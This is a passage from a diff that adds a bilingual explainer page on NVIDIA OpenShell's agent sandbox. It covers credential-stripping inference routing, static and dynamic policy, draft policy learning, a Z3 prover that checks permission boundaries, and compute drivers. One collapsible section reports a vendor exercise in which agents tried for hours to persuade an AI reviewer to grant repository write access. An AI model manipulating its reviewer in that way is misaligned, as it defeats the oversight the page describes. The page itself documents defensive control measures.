+        <p data-en="Mechanism: DNS interception. The Supervisor intercepts every request to the inference.local hostname and routes it through the privacy router (openshell-router). Agent-supplied credentials are stripped and replaced with gateway-managed ones; the router selects the correct LLM provider under policy, with provider bundles grouping related endpoints (API, streaming, embeddings) under a single provider." data-zh="機制：DNS 攔截。Supervisor 攔截所有發往 inference.local hostname 的請求，經 privacy router（openshell-router）路由。Agent 自帶的憑證會被剝除、換成 Gateway 管理的憑證；router 依政策選擇正確的 LLM provider，provider bundle 則把相關端點（API、streaming、embeddings）歸在單一 provider 之下。">Mechanism: DNS interception. The Supervisor intercepts every request to the <code>inference.local</code> hostname and routes it through the privacy router (<code>openshell-router</code>). Agent-supplied credentials are stripped and replaced with gateway-managed ones; the router selects the correct LLM provider under policy, with provider bundles grouping related endpoints (API, streaming, embeddings) under a single provider.</p>
+        <ul>
+          <li><strong data-en="Credential stripping" data-zh="憑證剝除">Credential stripping</strong> — <span data-en="removes agent-supplied credentials, injects gateway-managed credentials." data-zh="移除 agent 自帶憑證，注入 Gateway 管理的憑證。">removes agent-supplied credentials, injects gateway-managed credentials.</span></li>
+          <li><strong data-en="Provider selection" data-zh="Provider 選擇">Provider selection</strong> — <span data-en="routes to the correct LLM provider based on policy." data-zh="依政策路由到正確的 LLM provider。">routes to the correct LLM provider based on policy.</span></li>
+          <li><strong data-en="Privacy routing" data-zh="隱私路由">Privacy routing</strong> — <span data-en="requests go to approved providers only." data-zh="請求只送往已批准的 provider。">requests go to approved providers only.</span></li>
+        </ul>
+        <p><strong data-en="What it prevents:" data-zh="它防堵什麼：">What it prevents:</strong> <span data-en="agents sending prompts to unauthorized LLM providers, credential exfiltration via prompt content, and shadow AI usage. (The NemoClaw reference stack builds managed inference and routing on top of OpenShell; detailed routing rules such as local-vs-cloud selection are documented there, not in the materials verified for this page.)" data-zh="agent 把 prompt 送往未授權 LLM provider、經 prompt 內容外洩憑證，以及 shadow AI 使用。（NemoClaw reference stack 在 OpenShell 之上提供 managed inference 與 routing；本地 vs 雲端選擇等細部路由規則記載於該文件，不在本頁查證材料之列。）">agents sending prompts to unauthorized LLM providers, credential exfiltration via prompt content, and shadow AI usage. (The NemoClaw reference stack builds managed inference and routing on top of OpenShell; detailed routing rules such as local-vs-cloud selection are documented there, not in the materials verified for this page.)</span></p>
+      </div>
+    </section>
+
+    <!-- ============ 6 · POLICY LIFECYCLE ============ -->
+    <section class="chapter" id="s6">
+      <div class="ch-head"><span class="ch-num">06</span><h2 data-en="Policy lifecycle" data-zh="政策生命週期">Policy lifecycle</h2><span class="tag d0003">D0003 · openshell-policy</span></div>
+      <p class="ch-sub" data-en="Why the static/dynamic split exists: kernel policies cannot be safely relaxed after application, so filesystem and process rules lock at creation. Proxy-level policies stay dynamic because an agent may legitimately discover new dependencies — which is exactly what the draft-learning loop is for." data-zh="Static/dynamic 切分的原因：核心政策在套用後無法安全放寬，因此 filesystem 與 process 規則在建立時鎖定。Proxy 層政策保持動態，因為 agent 可能合理地發現新依賴——這正是 draft 學習迴圈存在的理由。">Why the static/dynamic split exists: kernel policies cannot be safely relaxed after application, so filesystem and process rules lock at creation. Proxy-level policies stay dynamic because an agent may legitimately discover new dependencies — which is exactly what the draft-learning loop is for.</p>
+
+      <div class="tblwrap"><table>
+        <thead><tr><th data-en="Property" data-zh="屬性">Property</th><th data-en="Static — Filesystem, Process" data-zh="Static——Filesystem、Process">Static — Filesystem, Process</th><th data-en="Dynamic — Network, Inference" data-zh="Dynamic——Network、Inference">Dynamic — Network, Inference</th></tr></thead>
+        <tbody>
+          <tr><td data-en="When applied" data-zh="套用時機">When applied</td><td data-en="Sandbox creation" data-zh="Sandbox 建立時">Sandbox creation</td><td data-en="Any time at runtime" data-zh="執行期隨時">Any time at runtime</td></tr>
+          <tr><td data-en="Changeable" data-zh="可否變更">Changeable</td><td data-en="No — locked for the sandbox lifetime; changes need a new sandbox" data-zh="否——鎖定至 sandbox 終止；變更需建立新 sandbox">No — locked for the sandbox lifetime; changes need a new sandbox</td><td data-en="Yes — hot-reloadable; the supervisor retries the reload" data-zh="是——可 hot-reload；supervisor 會重試 reload">Yes — hot-reloadable; the supervisor retries the reload</td></tr>
+          <tr><td data-en="Enforcement" data-zh="執行層">Enforcement</td><td data-en="Kernel-level (Landlock, seccomp)" data-zh="核心層（Landlock、seccomp）">Kernel-level (Landlock, seccomp)</td><td data-en="Proxy-level (OPA, routing)" data-zh="Proxy 層（OPA、routing）">Proxy-level (OPA, routing)</td></tr>
+        </tbody>
+      </table></div>
+
+      <h3 class="sub" data-en="Validation: violations &amp; constants" data-zh="驗證：違規類型與常數">Validation: violations &amp; constants</h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th>Violation</th><th data-en="Description" data-zh="說明">Description</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><code>InvalidProcessIdentity</code></td><td data-en="Process user/group is not sandbox:sandbox" data-zh="Process user/group 不是 sandbox:sandbox">Process user/group is not <code>sandbox:sandbox</code></td></tr>
+          <tr><td class="c"><code>PathTraversal</code></td><td data-en="Path contains .. components" data-zh="路徑含 .. 元件">Path contains <code>..</code> components</td></tr>
+          <tr><td class="c"><code>RelativePath</code></td><td data-en="Path is not absolute" data-zh="路徑不是絕對路徑">Path is not absolute</td></tr>
+          <tr><td class="c"><code>OverlyBroadPath</code></td><td data-en="Path too permissive (e.g. /)" data-zh="路徑過寬（例如 /）">Path too permissive (e.g. <code>/</code>)</td></tr>
+          <tr><td class="c"><code>FieldTooLong</code></td><td data-en="Path exceeds 4096 characters" data-zh="路徑超過 4096 字元">Path exceeds 4096 characters</td></tr>
+          <tr><td class="c"><code>TooManyPaths</code></td><td data-en="More than 256 filesystem paths" data-zh="Filesystem 路徑超過 256 條">More than 256 filesystem paths</td></tr>
+          <tr><td class="c"><code>TldWildcard</code></td><td data-en="Network host uses a TLD wildcard (*.com)" data-zh="Network host 使用 TLD wildcard（*.com）">Network host uses a TLD wildcard (<code>*.com</code>)</td></tr>
+        </tbody>
+      </table></div>
+      <p><span class="chip">MAX_FILESYSTEM_PATHS = 256</span> <span class="chip">MAX_PATH_LENGTH = 4096</span></p>
+
+      <h3 class="sub" data-en="Composition &amp; merge" data-zh="組合與合併">Composition &amp; merge</h3>
+      <p data-en="A live policy is composed from three sources: (1) the operator-defined base policy, (2) provider policy layers — each attached provider contributes network rules (e.g. the Anthropic provider adds api.anthropic.com), and (3) approved draft proposals learned from denied requests. Merge operations (PolicyMergeOp): AddNetworkRule, RemoveNetworkEndpoint, RemoveNetworkRule, AddDenyRules / AddAllowRules, RemoveNetworkBinary. Before adding anything, policy_covers_rule() checks semantic coverage so an existing policy that already covers a proposal does not accumulate redundant rules." data-zh="生效中的政策由三個來源組合：(1) 操作者定義的 base policy；(2) provider policy layer——每個附加的 provider 貢獻網路規則（例如 Anthropic provider 加入 api.anthropic.com）；(3) 經批准的 draft 提案（由被拒請求學習而來）。合併操作（PolicyMergeOp）：AddNetworkRule、RemoveNetworkEndpoint、RemoveNetworkRule、AddDenyRules / AddAllowRules、RemoveNetworkBinary。加入任何規則前，policy_covers_rule() 先做語義涵蓋檢查，避免既有政策已涵蓋的提案累積冗餘規則。">A live policy is composed from three sources: (1) the operator-defined <strong>base policy</strong>, (2) <strong>provider policy layers</strong> — each attached provider contributes network rules (e.g. the Anthropic provider adds <code>api.anthropic.com</code>), and (3) approved <strong>draft proposals</strong> learned from denied requests. Merge operations (<code>PolicyMergeOp</code>): <code>AddNetworkRule</code>, <code>RemoveNetworkEndpoint</code>, <code>RemoveNetworkRule</code>, <code>AddDenyRules</code> / <code>AddAllowRules</code>, <code>RemoveNetworkBinary</code>. Before adding anything, <code>policy_covers_rule()</code> checks semantic coverage so an existing policy that already covers a proposal does not accumulate redundant rules.</p>
+
+      <h3 class="sub" data-en="Policy learning: draft recommendations" data-zh="政策學習：draft 建議">Policy learning: draft recommendations</h3>
+      <p data-en="When the OPA proxy denies a request, the denial is aggregated by the supervisor and reported to the Gateway, which builds draft policy chunks — proposed additions that would have allowed the denied traffic. Each chunk tracks hit_count, created_at, decided_at and a validation_result from the prover. The operator can:" data-zh="當 OPA proxy 拒絕一個請求，supervisor 會彙總該拒絕事件並回報 Gateway，由 Gateway 建成 draft policy chunk——即「若加入就能放行該流量」的提案。每個 chunk 追蹤 hit_count、created_at、decided_at，以及 prover 給出的 validation_result。操作者可以：">When the OPA proxy denies a request, the denial is aggregated by the supervisor and reported to the Gateway, which builds <strong>draft policy chunks</strong> — proposed additions that would have allowed the denied traffic. Each chunk tracks <code>hit_count</code>, <code>created_at</code>, <code>decided_at</code> and a <code>validation_result</code> from the prover. The operator can:</p>
+      <div class="tabs" style="margin-top:4px">
+        <span class="chip" style="font-size:.85rem;padding:6px 14px">Approve</span>
+        <span class="chip" style="font-size:.85rem;padding:6px 14px">Reject</span>
+        <span class="chip" style="font-size:.85rem;padding:6px 14px">Edit</span>
+        <span class="chip" style="font-size:.85rem;padding:6px 14px">Undo</span>
+        <span class="chip" style="font-size:.85rem;padding:6px 14px">Clear</span>
+      </div>
+      <p style="margin-top:12px" data-en="The system also auto-drafts proposals for blocked connections; drafts pass the same checks and review — and the opt-in auto-approval gate from Section 2 applies to them as well." data-zh="系統也會針對被阻擋的連線自動起草提案；draft 同樣經過檢查與審查——第 2 節的 opt-in 自動批准閘門也適用於它們。">The system also auto-drafts proposals for blocked connections; drafts pass the same checks and review — and the opt-in auto-approval gate from Section 2 applies to them as well.</p>
+    </section>
+
+    <!-- ============ 7 · Z3 PROVER ============ -->
+    <section class="chapter" id="s7">
+      <div class="ch-head"><span class="ch-num">07</span><h2 data-en="The Z3 prover: verification before enforcement" data-zh="Z3 prover：先驗證，再執行">The Z3 prover: verification before enforcement</h2><span class="tag d0003">D0003 · openshell-prover</span></div>
+      <p class="ch-sub" data-en="Before a policy is deployed, the prover encodes it as SMT constraints and checks security invariants — credential scope expansion, L7 bypass paths, link-local reachability. This is a pre-enforcement gate: a policy that fails never reaches a sandbox. Per the official blog, the prover checks whether modelled permissions (including provider-contributed access) stay inside the operator-defined boundary, and the agent's own interpretation cannot change the outcome." data-zh="政策部署前，prover 將其編碼為 SMT 約束並檢查安全不變量——憑證範圍擴張、L7 繞過路徑、link-local 可達性。這是一道 pre-enforcement 閘門：未通過的政策永遠到不了 sandbox。依官方部落格，prover 檢查 modelled permissions（含 provider 貢獻的存取）是否留在操作者定義的 boundary 內，且 agent 自己的詮釋無法改變結果。">Before a policy is deployed, the prover encodes it as SMT constraints and checks security invariants — credential scope expansion, L7 bypass paths, link-local reachability. This is a <strong>pre-enforcement gate</strong>: a policy that fails never reaches a sandbox. Per the official blog, the prover checks whether modelled permissions (including provider-contributed access) stay inside the operator-defined boundary, and the agent's own interpretation cannot change the outcome.</p>
+
+      <pre>Policy YAML ──────┐
+Credential Set ───┤── build_model() ──► Z3 Constraints ──► run_all_queries()
+Binary Registry ──┘                                              │
+                                                                 ▼
+                                                         Finding Report
+                                                         (pass / fail)</pre>
+      <pre><span class="cm">// openshell-prover — primary entry point (D0003)</span>
+<span class="kw">pub fn</span> prove(
+    policy_path: &amp;str,
+    credentials_path: &amp;str,
+    registry_dir: Option&lt;&amp;str&gt;,
+    accepted_risks_path: Option&lt;&amp;str&gt;,
+    compact: bool,
+) -&gt; Result&lt;i32&gt;</pre>
+      <p><span class="chip">exit 0 = pass (no critical/high findings)</span> <span class="chip">exit 1 = fail</span> <span class="chip">exit 2 = input error</span> <span style="margin-left:6px" data-en="Solver: Z3 v0.19 (D0003)." data-zh="Solver：Z3 v0.19（D0003）。">Solver: Z3 v0.19 (D0003).</span></p>
+
+      <h3 class="sub" data-en="Four finding categories" data-zh="四類 finding">Four finding categories</h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th>Finding ID</th><th data-en="Name" data-zh="名稱">Name</th><th data-en="What it detects" data-zh="偵測內容">What it detects</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><code>LINK_LOCAL_REACH</code></td><td data-en="Link-local reachability" data-zh="Link-local 可達性">Link-local reachability</td><td data-en="Policy allows access to 169.254.x.x (cloud metadata services)" data-zh="政策允許存取 169.254.x.x（雲端 metadata 服務）">Policy allows access to 169.254.x.x (cloud metadata services)</td></tr>
+          <tr><td class="c"><code>L7_BYPASS_CREDENTIALED</code></td><td data-en="L7-bypass with credentials" data-zh="帶憑證的 L7 繞過">L7-bypass with credentials</td><td data-en="A binary that bypasses L7 inspection has a credential in scope" data-zh="繞過 L7 檢查的 binary，其作用域內存在憑證">A binary that bypasses L7 inspection has a credential in scope</td></tr>
+          <tr><td class="c"><code>CREDENTIAL_REACH_EXPANSION</code></td><td data-en="Credential scope expansion" data-zh="憑證範圍擴張">Credential scope expansion</td><td data-en="A credential is visible to unintended binaries / endpoints" data-zh="憑證對非預期的 binary / endpoint 可見">A credential is visible to unintended binaries / endpoints</td></tr>
+          <tr><td class="c"><code>CAPABILITY_EXPANSION</code></td><td data-en="Capability expansion" data-zh="能力擴張">Capability expansion</td><td data-en="A binary gains capabilities beyond its intended scope" data-zh="Binary 取得超出其預期範圍的能力">A binary gains capabilities beyond its intended scope</td></tr>
+        </tbody>
+      </table></div>
+
+      <p data-en="Accepted risks: operators can acknowledge known risks via an accepted_risks file. Matching findings are still reported, but do not cause a failure exit code — intentional relaxations stay possible while keeping an audit trail." data-zh="Accepted risks：操作者可經 accepted_risks 檔案承認已知風險。符合的 finding 仍會被報告，但不觸發失敗 exit code——刻意的放寬得以保留，同時留下稽核軌跡。"><strong>Accepted risks:</strong> operators can acknowledge known risks via an <code>accepted_risks</code> file. Matching findings are still reported, but do not cause a failure exit code — intentional relaxations stay possible while keeping an audit trail.</p>
+
+      <div class="note bad">
+        <div class="note-t" data-en="Evidence note — read the Z3 detail at the right level" data-zh="證據註記——以正確的層級閱讀 Z3 細節">Evidence note — read the Z3 detail at the right level <span class="tag unconf" data-en="Not in NVIDIA blog / architecture pages" data-zh="未見於 NVIDIA 部落格／架構頁">Not in NVIDIA blog / architecture pages</span></div>
+        <p style="margin:0" data-en="The prover's existence and its boundary-check role are confirmed by NVIDIA's official blog. The Z3 engine itself, the four finding IDs above, and the exit-code contract come from D0003's repo-level reading (openshell-prover). In the verification pass for this page (2026-10-29), the string “Z3” did not appear in the NVIDIA blog or architecture pages checked — only in third-party repo readings. Treat the Z3 specifics as note/repo-level detail, not as an official NVIDIA blog claim, and verify against the code at your pinned version. Known scope limit: the official blog calls multi-agent composition analysis ongoing work; an independent (non-peer-reviewed) test summary further reports that the boundary check does not model GraphQL / MCP / WebSocket / JSON-RPC rules — flagged here as to-be-confirmed against pinned-version docs." data-zh="Prover 的存在與其 boundary-check 角色已由 NVIDIA 官方部落格確認。但 Z3 引擎本身、上述四個 finding ID 與 exit code 合約，來自 D0003 的 repo 層級解讀（openshell-prover）。在本頁的查證（2026-10-29）中，「Z3」字樣未出現在所查的 NVIDIA 部落格與架構頁——僅見於第三方 repo 解讀。請將 Z3 細節視為筆記／repo 層級資料，而非 NVIDIA 官方部落格主張，並以鎖定版本的程式碼為準再驗證。已知範圍限制：官方部落格稱多 agent 組合分析為 ongoing work；一份獨立（非同行評審）測試摘要另指出 boundary check 不建模 GraphQL / MCP / WebSocket / JSON-RPC 規則——此點在此標為待以鎖定版本文件確認。">The prover's existence and its boundary-check role are confirmed by NVIDIA's official blog. The <strong>Z3 engine itself, the four finding IDs above, and the exit-code contract come from D0003's repo-level reading</strong> (<code>openshell-prover</code>). In the verification pass for this page (2026-10-29), the string “Z3” did <strong>not</strong> appear in the NVIDIA blog or architecture pages checked — only in third-party repo readings. Treat the Z3 specifics as note/repo-level detail, not as an official NVIDIA blog claim, and verify against the code at your pinned version. Known scope limit: the official blog calls multi-agent composition analysis <em>ongoing work</em>; an independent (non-peer-reviewed) test summary further reports that the boundary check does not model GraphQL / MCP / WebSocket / JSON-RPC rules — flagged here as to-be-confirmed against pinned-version docs.</p>
+      </div>
+
+      <details>
+        <summary data-en="Why a prover matters: the persuasion experiment NVIDIA describes" data-zh="Prover 為何重要：NVIDIA 描述的勸說實驗">Why a prover matters: the persuasion experiment NVIDIA describes</summary>
+        <div class="det-body">
+          <p data-en="NVIDIA's technical blog describes a long-running adversarial exercise in which frontier agents with lowered safeguards spent up to roughly two hours trying to persuade an AI reviewer to grant write access to a protected GitHub repository. OpenShell's formal policy analysis gave the reviewer evidence of the permissions' actual scope even as the agent tried to manipulate it; combined with review and runtime controls, no protected-repository write occurred in the exercise, while useful access remained available." data-zh="NVIDIA 技術部落格描述了一場長期對抗實驗：safeguards 被降低的 frontier agent 花費最長約兩小時，試圖說服 AI reviewer 授予受保護 GitHub repository 的寫入權限。OpenShell 的形式化政策分析為 reviewer 提供了權限實際範圍的證據，即使 agent 試圖操縱它；結合審查與 runtime 控制後，實驗中未發生受保護 repository 的寫入，同時仍允許有用存取。">NVIDIA's technical blog describes a long-running adversarial exercise in which frontier agents with lowered safeguards spent up to roughly two hours trying to persuade an AI reviewer to grant write access to a protected GitHub repository. OpenShell's formal policy analysis gave the reviewer evidence of the permissions' actual scope even as the agent tried to manipulate it; combined with review and runtime controls, no protected-repository write occurred in the exercise, while useful access remained available.</p>
+          <p style="margin:0"><span class="tag vendor" data-en="Vendor-described experiment" data-zh="廠商描述的實驗">Vendor-described experiment</span> <span data-en="Quote it as “in NVIDIA's described internal exercise, zero protected writes in that scenario” — the sample size, model names, control group and statistics were not published, so it is not a security guarantee and not proof against persuasion attacks in general." data-zh="引用時應寫為「在 NVIDIA 描述的內部實驗情境中，受保護寫入為零」——樣本數、模型名、對照組與統計方法皆未公開，因此它不是安全保證，也不能證明可防止所有勸說攻擊。">Quote it as “in NVIDIA's described internal exercise, zero protected writes in that scenario” — the sample size, model names, control group and statistics were not published, so it is not a security guarantee and not proof against persuasion attacks in general.</span></p>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ 8 · COMPUTE DRIVERS ============ -->
+    <section class="chapter" id="s8">
+      <div class="ch-head"><span class="ch-num">08</span><h2 data-en="Compute drivers: one contract, four backends" data-zh="Compute drivers：一個合約，四種後端">Compute drivers: one contract, four backends</h2><span class="tag d0003">D0003</span><span class="tag docs" data-en="Docs verified" data-zh="文件實查">Docs verified</span></div>
+      <p class="ch-sub" data-en="Docker, Podman, Kubernetes and MicroVM (libkrun) are formal drivers sharing the ComputeDriver gRPC contract — the Gateway is compute-backend-agnostic. Correction to older secondary reporting: Kubernetes is a formally listed runtime, not the experimental path; the path docs mark experimental is Windows WSL 2. Kubernetes carries one load-bearing precondition — your CNI must actually enforce NetworkPolicy." data-zh="Docker、Podman、Kubernetes 與 MicroVM（libkrun）是正式 driver，共用 ComputeDriver gRPC 合約——Gateway 與 compute backend 解耦。更正較舊的二手說法：Kubernetes 是正式列出的 runtime，不是實驗性路徑；文件標為 experimental 的是 Windows WSL 2。Kubernetes 附帶一個關鍵前提——你的 CNI 必須確實執行 NetworkPolicy。">Docker, Podman, Kubernetes and MicroVM (libkrun) are formal drivers sharing the <code>ComputeDriver</code> gRPC contract — the Gateway is compute-backend-agnostic. Correction to older secondary reporting: Kubernetes is a formally listed runtime, <strong>not</strong> the experimental path; the path docs mark experimental is Windows WSL 2. Kubernetes carries one load-bearing precondition — your CNI must actually enforce NetworkPolicy.</p>
+
+      <pre><span class="cm">// ComputeDriver gRPC contract (D0003)</span>
+<span class="kw">service</span> ComputeDriver {
+  <span class="kw">rpc</span> GetCapabilities(...)       <span class="kw">returns</span> (GetCapabilitiesResponse);
+  <span class="kw">rpc</span> ValidateSandboxCreate(...) <span class="kw">returns</span> (ValidateSandboxCreateResponse);
+  <span class="kw">rpc</span> CreateSandbox(...)         <span class="kw">returns</span> (CreateSandboxResponse);
+  <span class="kw">rpc</span> GetSandbox(...)            <span class="kw">returns</span> (GetSandboxResponse);
+  <span class="kw">rpc</span> ListSandboxes(...)         <span class="kw">returns</span> (ListSandboxesResponse);
+  <span class="kw">rpc</span> StopSandbox(...)           <span class="kw">returns</span> (StopSandboxResponse);
+  <span class="kw">rpc</span> DeleteSandbox(...)         <span class="kw">returns</span> (DeleteSandboxResponse);
+  <span class="kw">rpc</span> WatchSandboxes(...)        <span class="kw">returns</span> (stream WatchSandboxesEvent);
+}</pre>
+
+      <div class="tblwrap"><table>
+        <thead><tr><th data-en="Feature" data-zh="特性">Feature</th><th>Docker</th><th>Podman</th><th>Kubernetes</th><th>MicroVM (libkrun)</th></tr></thead>
+        <tbody>
+          <tr><td data-en="Isolation" data-zh="隔離">Isolation</td><td data-en="Container (cgroups + namespaces)" data-zh="Container（cgroups + namespaces）">Container (cgroups + namespaces)</td><td data-en="Rootless container" data-zh="Rootless container">Rootless container</td><td data-en="Pod (cgroups + namespaces)" data-zh="Pod（cgroups + namespaces）">Pod (cgroups + namespaces)</td><td data-en="Hardware VM (KVM)" data-zh="硬體 VM（KVM）">Hardware VM (KVM)</td></tr>
+          <tr><td data-en="Supervisor placement" data-zh="Supervisor 部署">Supervisor placement</td><td data-en="Separate container, Unix socket, workload networking off" data-zh="獨立 container、Unix socket、workload 網路關閉">Separate container, Unix socket, workload networking off</td><td data-en="Same as Docker" data-zh="同 Docker">Same as Docker</td><td data-en="Separate pod, private service over mTLS, NetworkPolicy allows only the supervisor service" data-zh="獨立 pod、經私有 service 走 mTLS、NetworkPolicy 僅允許 supervisor service">Separate pod, private service over mTLS, NetworkPolicy allows only the supervisor service</td><td data-en="Host process, vsock; the guest has no network device" data-zh="Host 程序、vsock；guest 無網路裝置">Host process, vsock; the guest has no network device</td></tr>
+          <tr><td>Rootless</td><td data-en="No (daemon)" data-zh="否（daemon）">No (daemon)</td><td>Yes</td><td data-en="N/A (cluster)" data-zh="不適用（叢集）">N/A (cluster)</td><td>Yes</td></tr>
+          <tr><td>GPU support</td><td>NVIDIA runtime</td><td>NVIDIA CDI</td><td>Device plugin</td><td>VFIO passthrough</td></tr>
+          <tr><td>Networking</td><td>Bridge / host</td><td>Slirp4netns</td><td>CNI plugin</td><td>virtio-net</td></tr>
+          <tr><td data-en="Use case" data-zh="適用情境">Use case</td><td data-en="Local dev" data-zh="本地開發">Local dev</td><td data-en="Security-sensitive local" data-zh="安全敏感的本地環境">Security-sensitive local</td><td data-en="Production at scale" data-zh="大規模生產">Production at scale</td><td data-en="Maximum isolation" data-zh="最高隔離">Maximum isolation</td></tr>
+          <tr><td data-en="Platform config" data-zh="平台組態">Platform config</td><td data-en="Driver-native" data-zh="Driver 原生">Driver-native</td><td data-en="Driver-native" data-zh="Driver 原生">Driver-native</td><td class="c">runtimeClassName, annotations, volumeClaimTemplates</td><td data-en="libkrun-specific" data-zh="libkrun 專屬">libkrun-specific</td></tr>
+        </tbody>
+      </table></div>
+      <p style="font-size:.88rem;color:var(--muted)" data-en="Runtime-placement row per the verified architecture docs; the rest of the comparison is D0003. The default sandbox image is a minimal Ubuntu with no agent preinstalled — you bring your own harness; the first docs walkthrough uses OpenCode with a free OpenRouter model." data-zh="「Supervisor 部署」列依查證的架構文件；比較表其餘部分出自 D0003。預設 sandbox image 為 minimal Ubuntu、不預裝 agent——需自帶 harness；文件首個 walkthrough 使用 OpenCode 加免費 OpenRouter 模型。">Runtime-placement row per the verified architecture docs; the rest of the comparison is D0003. The default sandbox image is a minimal Ubuntu with no agent preinstalled — you bring your own harness; the first docs walkthrough uses OpenCode with a free OpenRouter model.</p>
+
+      <h3 class="sub" data-en="Provisioning model: DriverSandboxSpec" data-zh="Provisioning 模型：DriverSandboxSpec">Provisioning model: DriverSandboxSpec</h3>
+      <pre>DriverSandboxSpec
+├── log_level: String
+├── environment: Map&lt;String, String&gt;   <span class="cm"># credential injection happens here</span>
+├── sandbox_token: String              <span class="cm"># gateway-minted JWT</span>
+├── gpu: bool
+└── template: DriverSandboxTemplate
+    ├── image: String                  <span class="cm"># OCI image reference</span>
+    ├── agent_socket_path: String
+    ├── labels: Map&lt;String, String&gt;
+    ├── environment: Map&lt;String, String&gt;
+    ├── resources: DriverResourceRequirements
+    ├── platform_config: Struct        <span class="cm"># driver-specific overrides</span>
+    └── driver_config: Struct          <span class="cm"># selected driver config</span></pre>
+      <p data-en="The key insight in D0003's model: credentials are materialised as environment variables by the Gateway into DriverSandboxSpec.environment — never stored inside the sandbox image. The Supervisor reads them at startup and passes them to the agent process via child_env." data-zh="D0003 模型中的關鍵洞察：憑證由 Gateway materialise 為環境變數，寫入 DriverSandboxSpec.environment——永不存入 sandbox image。Supervisor 在啟動時讀取，並經 child_env 傳給 agent 程序。">The key insight in D0003's model: credentials are <strong>materialised as environment variables</strong> by the Gateway into <code>DriverSandboxSpec.environment</code> — never stored inside the sandbox image. The Supervisor reads them at startup and passes them to the agent process via <code>child_env</code>.</p>
+
+      <div class="note warn">
+        <div class="note-t" data-en="Credential tension — read both mechanisms together" data-zh="憑證機制的張力——兩種機制要一起讀">Credential tension — read both mechanisms together</div>
+        <p style="margin:0" data-en="D0003's provisioning model (startup env materialisation → child_env) sits next to NVIDIA's blog framing, which emphasises proxy-side substitution outside the workload: real credentials are replaced at request time, only for endpoints that satisfy both network policy and credential binding, and delivery to an unapproved destination is refused. Both mechanisms are presented here because both are in the sources. The invariant that reconciles them: whatever reaches the agent as env is scoped provider material for approved use; the proxy strips and rewrites agent-originated credentials at request time — and the agent must never see gateway credentials for endpoints it is not approved for. Do not quote either half alone as “credentials never enter the sandbox” or “credentials are just env vars.”" data-zh="D0003 的 provisioning 模型（啟動時 env materialisation → child_env）與 NVIDIA 部落格的說法並存：後者強調 proxy 側在 workload 外替換——真憑證只在 request 時、且僅對同時滿足 network policy 與 credential binding 的端點替換，送往未批准目的地會被拒絕。兩種機制都在來源中出現，故本頁並列呈現。調和兩者的不變量是：抵達 agent 的 env 是範圍受限、供已批准用途的 provider 材料；proxy 會在 request 時剝除並重寫 agent 自帶的憑證——且 agent 絕不能看到其未獲批准端點的 gateway 憑證。不要只引其中一半，說成「憑證從不進入 sandbox」或「憑證不過是 env var」。">D0003's provisioning model (startup env materialisation → <code>child_env</code>) sits next to NVIDIA's blog framing, which emphasises <strong>proxy-side substitution outside the workload</strong>: real credentials are replaced at request time, only for endpoints that satisfy both network policy and credential binding, and delivery to an unapproved destination is refused. Both mechanisms are presented here because both are in the sources. The invariant that reconciles them: whatever reaches the agent as env is scoped provider material for approved use; the proxy strips and rewrites agent-originated credentials at request time — and the agent must never see gateway credentials for endpoints it is not approved for. Do not quote either half alone as “credentials never enter the sandbox” or “credentials are just env vars.”</p>
+      </div>
+
+      <details>
+        <summary data-en="Isolation is one axis; policy semantics are another" data-zh="隔離是 一個維度；政策語義是另一個">Isolation is one axis; policy semantics are another</summary>
+        <div class="det-body">
+          <p data-en="Conceptual comparison (from the verified research): a plain container shares the host kernel, so namespaces/cgroups alone do not make an agent safe — a policy layer is what constrains it. A MicroVM (Firecracker-style, or OpenShell's own VM driver) gives each sandbox its own kernel behind a hypervisor boundary — stronger isolation, at higher management cost. A user-space kernel such as gVisor intercepts syscalls between the two. OpenShell's distinct strength is not raw isolation but policy semantics: per-binary / per-method / per-path rules, credential binding, and formal verification. The two axes compose — OpenShell's policy layer can itself run on its MicroVM driver." data-zh="概念對照（出自查證研究）：一般 container 共享 host kernel，namespace/cgroup 本身不足以讓 agent 安全——約束它的是政策層。MicroVM（如 Firecracker 式，或 OpenShell 自己的 VM driver）讓每個 sandbox 有獨立 kernel、隔著 hypervisor 邊界——隔離更強，管理成本也更高。gVisor 這類 user-space kernel 則在兩者之間攔截 syscall。OpenShell 的獨特強項不是原始隔離強度，而是政策語義：per-binary / per-method / per-path 規則、憑證綁定與形式驗證。兩個維度可以組合——OpenShell 的政策層本身就能跑在自己的 MicroVM driver 上。">Conceptual comparison (from the verified research): a plain container shares the host kernel, so namespaces/cgroups alone do not make an agent safe — a policy layer is what constrains it. A MicroVM (Firecracker-style, or OpenShell's own VM driver) gives each sandbox its own kernel behind a hypervisor boundary — stronger isolation, at higher management cost. A user-space kernel such as gVisor intercepts syscalls between the two. OpenShell's distinct strength is not raw isolation but <strong>policy semantics</strong>: per-binary / per-method / per-path rules, credential binding, and formal verification. The two axes compose — OpenShell's policy layer can itself run on its MicroVM driver.</p>
+          <p style="margin:0;font-size:.9rem;color:var(--muted)" data-en="Third-party sandbox latency figures (E2B ≈150–200 ms, Daytona &lt;90 ms, Modal sub-second) come from different vendors and measurement methods and are not ranked here — they are vendor-reported and not comparable head-to-head." data-zh="第三方 sandbox 的延遲數字（E2B ≈150–200 ms、Daytona &lt;90 ms、Modal sub-second）來自不同廠商與量測方法，本頁不做排名——皆為廠商主張，無法直接相比。">Third-party sandbox latency figures (E2B ≈150–200 ms, Daytona &lt;90 ms, Modal sub-second) come from different vendors and measurement methods and are not ranked here — they are vendor-reported and not comparable head-to-head.</p>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ 9 · AUTH ============ -->
+    <section class="chapter" id="s9">
+      <div class="ch-head"><span class="ch-num">09</span><h2 data-en="Authentication &amp; identity" data-zh="認證與身分">Authentication &amp; identity</h2><span class="tag d0003">D0003</span></div>
+      <p class="ch-sub" data-en="A three-variant principal model. The load-bearing invariant: a sandbox principal's sandbox_id must match the sandbox_id in every request body — that single check is what stops a compromised sandbox from addressing another sandbox's resources (IDOR)." data-zh="三變體的 principal 模型。關鍵不變量：sandbox principal 的 sandbox_id 必須與每個 request body 中的 sandbox_id 一致——光是這一項檢查，就阻止被攻陷的 sandbox 存取其他 sandbox 的資源（IDOR）。">A three-variant principal model. The load-bearing invariant: a sandbox principal's <code>sandbox_id</code> must match the <code>sandbox_id</code> in every request body — that single check is what stops a compromised sandbox from addressing another sandbox's resources (IDOR).</p>
+
+      <pre><span class="kw">enum</span> Principal {
